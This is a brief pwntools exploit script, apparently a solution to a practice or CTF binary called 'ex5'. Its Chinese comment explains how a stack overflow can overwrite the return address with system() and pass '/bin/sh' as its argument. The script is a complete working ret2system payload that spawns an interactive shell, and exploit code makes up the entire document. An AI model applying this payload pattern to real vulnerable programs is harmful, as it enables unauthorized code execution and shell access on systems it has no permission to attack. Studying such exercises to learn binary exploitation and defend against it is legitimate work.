from pwn import *
"""
思路: 
    程序调用system函数时，去ebp+4的位置寻找参数。为了将/bin/sh作为system的参数，在栈溢出时，修改eip为函数的地址，再填充4个字节的垃圾数据，再写/bin/sh。
"""

sys_addr = 0x08048460
binsh_addr = 0x08048720

payload = b"A" * 112 + p32(sys_addr) + b"A" * 4 + p32(binsh_addr)

p = process("./ex5")
p.sendline(payload)
p.interactive()
